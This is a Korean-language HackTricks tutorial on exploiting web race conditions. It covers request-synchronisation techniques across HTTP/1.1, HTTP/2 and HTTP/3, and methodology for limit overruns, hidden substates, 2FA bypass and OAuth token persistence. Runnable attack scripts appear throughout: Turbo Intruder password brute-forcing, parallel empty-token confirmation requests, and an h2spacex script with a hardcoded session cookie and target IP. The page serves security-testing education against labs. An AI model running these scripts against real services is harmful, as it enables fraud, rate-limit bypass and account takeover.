# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> 이 기법을 깊이 이해하려면 원본 리포트 [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)를 확인하세요

## Enhancing Race Condition Attacks

Race Condition을 이용하는 주요 장애물은 여러 요청이 거의 동시에 처리되도록 보장하는 것입니다. 즉 처리 시간 차이가 아주 작아야 하며 — 이상적으로는 1ms 미만이어야 합니다.

다음은 요청 동기화를 위한 몇 가지 기법입니다:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: 단일 TCP 연결로 두 요청을 보낼 수 있어 네트워크 지터의 영향을 줄입니다. 그러나 서버 측 변동으로 인해 두 요청만으로는 일관된 Race Condition exploit을 보장하지 못할 수 있습니다.
- **HTTP/1.1 'Last-Byte Sync'**: 20~30개의 요청의 대부분을 미리 전송하고 작은 조각 하나만 보류한 뒤, 그 조각들을 함께 전송하여 서버에 동시에 도달하게 합니다.

**Preparation for Last-Byte Sync** involves:

1. 헤더와 본문 데이터를 마지막 바이트를 제외하고 전송하되 스트림을 종료하지 않습니다.
2. 초기 전송 후 100ms 동안 대기합니다.
3. 최종 프레임을 배치하기 위해 TCP_NODELAY를 비활성화하여 Nagle's algorithm을 활용합니다.
4. 연결을 예열하기 위해 ping을 전송합니다.

보류한 프레임을 이어서 전송하면 하나의 패킷으로 도착해야 하며, 이는 Wireshark로 확인할 수 있습니다. 이 방법은 정적 파일에는 적용되지 않으며, 정적 파일은 일반적으로 RC 공격에 관여하지 않습니다.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3는 QUIC(UDP) 위에서 동작합니다. TCP coalescing나 Nagle 같은 것을 기대할 수 없기 때문에 기존의 last‑byte sync는 일반 클라이언트로는 작동하지 않습니다. 대신 여러 QUIC stream‑final DATA frames (FIN)을 의도적으로 같은 UDP datagram에 합쳐서 서버가 동일한 스케줄링 틱에서 모든 대상 요청을 처리하게 해야 합니다.
- **How to do it**: QUIC frame 제어를 노출하는 목적별 라이브러리를 사용하세요. 예를 들어 H3SpaceX는 quic-go를 조작하여 본문이 있는 요청과 본문 없는 GET 스타일 요청 모두에 대해 HTTP/3 last‑frame synchronization을 구현합니다.
- Requests‑with‑body: N개의 스트림에 대해 마지막 바이트를 제외한 HEADERS + DATA를 전송한 다음 각 스트림의 마지막 바이트를 함께 플러시하세요.
- GET‑style: 가짜 DATA frames(또는 Content‑Length가 있는 아주 작은 바디)를 만들어 모든 스트림을 하나의 datagram에서 종료시키세요.
- **Practical limits**:
  - 동시성은 피어의 QUIC max_streams transport parameter에 의해 제한됩니다 (HTTP/2의 SETTINGS_MAX_CONCURRENT_STREAMS와 유사). 값이 낮으면 여러 H3 연결을 열어 레이스를 분산시키세요.
  - UDP datagram 크기와 path MTU가 합칠 수 있는 stream‑final frames 수를 제한합니다. 라이브러리는 필요 시 여러 datagram으로 분할하는 처리를 하지만, 단일 datagram으로 플러시하는 것이 가장 신뢰할 수 있습니다.
- **Practice**: H3SpaceX에 동봉된 공개 H2/H3 race labs와 샘플 exploits가 있습니다.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### 서버 아키텍처에 적응하기

대상 아키텍처를 이해하는 것은 중요하다. 프론트엔드 서버는 요청을 다르게 라우팅할 수 있어 타이밍에 영향을 줄 수 있다. 중요하지 않은 요청을 통해 사전적으로 서버 측 연결 워밍업을 수행하면 요청 타이밍을 정규화할 수 있다.

#### 세션 기반 잠금 처리

PHP의 세션 핸들러 같은 프레임워크는 세션별로 요청을 직렬화하여 취약점을 숨길 수 있다. 각 요청에 대해 서로 다른 세션 토큰을 사용하면 이 문제를 회피할 수 있다.

#### rate 또는 리소스 제한 극복

연결 워밍업이 효과가 없다면, 더미 요청을 대량으로 보내 웹 서버의 rate 또는 리소스 제한 지연을 인위적으로 유발하면, 서버 측 지연이 race conditions에 유리하게 작용하여 single-packet attack을 용이하게 할 수 있다.

## 공격 예시

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: 요청을 **Turbo intruder**로 보낼 수 있다 (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`). 요청에서 브루트포스할 값인 **`%s`**는 `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`와 같이 변경할 수 있으며, 드롭다운에서 **`examples/race-single-packer-attack.py`**를 선택하면 된다:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

만약 **다른 값을 보낼 경우**, 클립보드의 wordlist를 사용하는 아래 코드로 수정할 수 있다:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> 웹이 HTTP2를 지원하지 않으면(HTTP1.1만 지원) `Engine.THREADED` 또는 `Engine.BURP`를 `Engine.BURP2` 대신 사용하세요.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: 요청을 1 endpoint로 보내고 이후 RCE를 유발하기 위해 다른 여러 endpoint로 요청을 보내야 하는 경우, `race-single-packet-attack.py` 스크립트를 다음과 같이 변경할 수 있습니다:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- 또한 **Repeater**에서는 Burp Suite의 새로운 '**Send group in parallel**' 옵션을 통해 사용할 수 있습니다.
- **limit-overrun**의 경우 그룹에 **같은 요청을 50번** 추가하면 됩니다.
- **connection warming**의 경우 **그룹**의 **초반**에 웹 서버의 정적이지 않은 부분으로 향하는 몇몇 **요청**을 **추가**할 수 있습니다.
- 2개의 substates 단계에서 한 요청과 다른 요청을 처리하는 과정 **사이**를 **지연**시키기 위해 두 요청 **사이에 추가 요청을 넣을 수 있습니다**.
- **multi-endpoint** RC의 경우 먼저 **숨겨진 상태로 가는 요청**을 보내고 그 직후에 **숨겨진 상태를 악용하는 50개의 요청**을 보낼 수 있습니다.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: 이 스크립트의 목적은 사용자의 이메일을 변경한 뒤 새 이메일의 검증 토큰이 마지막 이메일로 도착할 때까지 지속적으로 확인하는 것입니다(코드에서 이메일을 수정할 수는 있었지만 검증이 이전 이메일로 전송되는 RC가 발생했는데, 이는 이메일을 가리키는 변수가 이미 첫 번째 이메일로 채워져 있었기 때문입니다).\
수신된 이메일에서 "objetivo"라는 단어가 발견되면 변경된 이메일의 검증 토큰을 받은 것으로 판단하고 공격을 종료합니다.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: 엔진 및 게이팅 노트

- 엔진 선택: HTTP/2 대상에서는 `Engine.BURP2`를 사용하여 single‑packet attack을 유도하고; HTTP/1.1 last‑byte sync를 위해서는 `Engine.THREADED` 또는 `Engine.BURP`로 폴백한다.
- `gate`/`openGate`: `gate='race1'` (또는 시도별 gates)로 여러 복사본을 큐에 넣어 각 요청의 꼬리를 보류한다; `openGate('race1')`는 모든 꼬리를 함께 플러시하여 거의 동시에 도착하게 한다.
- 진단: Turbo Intruder에서 음수 타임스탬프는 서버가 요청이 완전히 전송되기 전에 응답했음을 나타내며 overlap을 증명한다. 이는 실제 races에서 예상되는 현상이다.
- 연결 워밍업: 타이밍을 안정시키기 위해 먼저 ping이나 몇 개의 무해한 요청을 보낸다; 최종 프레임의 배칭을 유도하기 위해 선택적으로 `TCP_NODELAY`를 비활성화한다.


### Single Packet Attack 개선

원래 연구에서는 이 공격이 1,500바이트의 한계가 있다고 설명했다. 그러나 [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)에서는 IP 레이어 단편화(IP layer fragmentation)를 사용해 single packet attack의 1,500바이트 제한을 TCP의 **65,535 B 윈도우 제한**으로 확장하는 방법(단일 패킷을 여러 IP 패킷으로 분할하고 서로 다른 순서로 전송해 모든 조각이 서버에 도달할 때까지 재조립을 방지)이 설명되어 있다. 이 기법으로 연구자는 약 166ms에 10,000개의 요청을 전송할 수 있었다.

이 개선은 수백/수천 개의 패킷이 동시에 도착해야 하는 RC에서 공격을 더 신뢰성 있게 만들 수 있지만, 소프트웨어적 제한이 있을 수 있다. Apache, Nginx, Go 같은 일부 인기 HTTP 서버는 `SETTINGS_MAX_CONCURRENT_STREAMS` 설정이 각각 100, 128, 250으로 엄격하다. 그러나 NodeJS와 nghttp2 같은 경우는 제한이 없다.\
이것은 기본적으로 Apache가 단일 TCP 연결에서 100개의 HTTP 스트림만 고려한다는 의미이며(이 RC 공격을 제한함) HTTP/3의 경우 유사한 제한은 QUIC의 max_streams 전송 파라미터다 — 값이 작으면 race를 여러 QUIC 연결에 분산시키자.

이 기법을 사용한 예제는 레포 [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main)에서 확인할 수 있다.

## Raw BF

이전 연구 이전에는 패킷을 가능한 한 빠르게 보내 RC를 발생시키려던 몇 가지 페이로드가 사용되었다.

- **Repeater:** Check the examples from the previous section.
- **Intruder**: **request**를 **Intruder**로 보낸 뒤, **Options menu**에서 **number of threads**를 **30**으로 설정하고, 페이로드로 **Null payloads**를 선택해 **30**개를 생성한다.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC 방법론**

### 제한 초과 / TOCTOU

이것은 가장 기본적인 유형의 race condition으로, 특정 동작을 수행할 수 있는 횟수를 제한하는 위치에서 **취약점**이 **발생하는** 경우입니다. 예를 들어 웹 스토어에서 동일한 할인 코드를 여러 번 사용하는 경우가 해당합니다. 매우 쉬운 예시는 [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) 또는 [**this bug**](https://hackerone.com/reports/759247)에서 확인할 수 있습니다.

이 종류의 공격에는 다음과 같은 다양한 변형이 있습니다:

- 기프트 카드 여러 번 사용
- 제품을 여러 번 평가
- 계좌 잔액을 초과해 현금 인출 또는 이체
- 단일 CAPTCHA 해답 재사용
- anti-brute-force rate limit 우회

### **숨겨진 하위 상태**

복잡한 race condition을 악용하려면 종종 짧은 시간 동안 나타나는 숨겨진 또는 **의도하지 않은 머신 하위 상태**와 상호작용할 기회를 이용해야 합니다. 접근 방법은 다음과 같습니다:

1. **가능한 숨겨진 하위 상태 식별**
- 사용자 프로필이나 password reset processes 같은 중요한 데이터를 수정하거나 상호작용하는 엔드포인트를 먼저 찾아보세요. 다음에 집중합니다:
- **Storage**: 클라이언트 측에서 처리하는 데이터보다 서버 측의 영구 데이터를 조작하는 엔드포인트를 우선시하세요.
- **Action**: 새로운 데이터를 추가하는 동작보다 기존 데이터를 변경하는 작업이 exploitable한 상태를 만들 가능성이 높습니다.
- **Keying**: 성공적인 공격은 보통 username이나 reset token과 같은 동일한 식별자로 키가 지정된 작업에서 발생합니다.
2. **초기 탐색 수행**
- 찾은 엔드포인트에 대해 race condition 공격을 시도하면서 예상 결과와의 편차를 관찰하세요. 예상치 못한 응답이나 애플리케이션 동작의 변화는 취약점을 나타낼 수 있습니다.
3. **취약점 입증**
- 보통 두 번의 요청만으로도 악용 가능한 경우가 많으므로, 취약점을 악용하는 데 필요한 최소 요청 수로 공격을 좁히세요. 정확한 타이밍이 요구되므로 여러 번의 시도나 자동화가 필요할 수 있습니다.

### 시간 민감 공격

정확한 타이밍으로 요청을 보낼 때 취약점이 드러날 수 있으며, 특히 timestamps 같은 예측 가능한 방법으로 security tokens를 생성하는 경우에 그렇습니다. 예를 들어 timestamps 기반으로 password reset tokens를 생성하면 동시에 들어온 요청에 대해 동일한 토큰이 생성될 수 있습니다.

악용 방법:

- single packet 공격처럼 정밀한 타이밍을 사용해 동시 password reset 요청을 만드세요. 동일한 tokens가 생성되면 취약점이 있음을 의미합니다.

예시:

- 동시에 두 개의 password reset tokens를 요청하고 비교해보세요. 토큰이 일치하면 토큰 생성에 결함이 있음을 시사합니다.

다음 [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)을 확인해 시도해 보세요.

## 숨겨진 하위 상태 사례 연구

### 결제 후 아이템 추가

다음 [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)에서 스토어에서 결제(pay)한 뒤 추가 아이템을 넣어 그 아이템에 대해 결제하지 않아도 되는 방법을 확인하세요.

### 다른 이메일 확인

아이디어는 이메일 주소를 verify하고 동시에 다른 이메일로 변경해 플랫폼이 변경된 새 이메일을 확인하는지 확인하는 것입니다.

### 이메일을 2개 주소로 변경 — Cookie 기반

[**this research**](https://portswigger.net/research/smashing-the-state-machine)에 따르면 Gitlab은 이 방법으로 takeover에 취약했는데, 한 이메일의 email verification token을 다른 이메일로 **전송**할 가능성이 있었기 때문입니다.

다음 [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)을 확인해 시도해 보세요.

### 숨겨진 데이터베이스 상태 / 확인 우회

만약 데이터베이스에 정보를 추가하기 위해 **2개의 다른 write**가 사용된다면, 데이터베이스에 **첫 번째 데이터만 기록된** 작은 시간이 존재할 수 있습니다. 예를 들어 계정을 생성할 때 username과 password가 먼저 **written**되고 그 다음에 새로 생성된 계정을 확인하기 위한 token이 쓰여질 수 있습니다. 이 경우 아주 짧은 시간 동안 계정 확인을 위한 token이 null 상태일 수 있습니다.

따라서 계정을 등록(register)한 직후 빈 token(`token=` 또는 `token[]=` 또는 다른 변형)을 사용해 여러 요청을 보내 계정을 확인(confirm)하면, 당신이 이메일을 제어하지 않는 계정도 confirm할 수 있게 될 수 있습니다.

다음 [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)을 확인해 시도해 보세요.

### 2FA 우회

다음 의사코드는 session이 생성되는 동안 아주 짧은 시간 동안 **2FA가 강제되지 않는** race condition에 취약합니다:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Theses services will allow you to create an application and authenticate users that the provider has registered. In order to do so, the **client** will need to **permit your application** to access some of their data inside of the **OAUth provider**.\
So, until here just a common login with google/linkedin/github... where you are prompted with a page saying: "_Application <InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

문제는 사용자가 이를 **accept it** 했을 때 발생하며, 그 즉시 **`authorization_code`** 가 악성 애플리케이션으로 전송됩니다. 이후 이 **application** 은 OAUth service provider의 Race Condition을 악용하여 해당 계정의 **`authorization_code`** 로부터 하나 이상의 AT/RT(Authentication Token/Refresh Token)를 생성합니다. 기본적으로 사용자가 애플리케이션이 자신의 데이터에 접근하는 것을 허용했다는 사실을 악용해 **여러 계정(create several accounts)** 을 만들 수 있습니다. 이후 사용자가 애플리케이션의 접근을 중단하면 한 쌍의 AT/RT는 삭제될 수 있지만, 다른 토큰들은 여전히 유효한 상태로 남아있게 됩니다.

#### Race Condition in `Refresh Token`

유효한 RT를 **obtained a valid RT** 한 후에는 이를 악용해 여러 개의 AT/RT를 **generate several AT/RT** 할 수 있으며, 사용자가 악성 애플리케이션에 대한 권한을 취소하더라도 **several RTs will still be valid.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
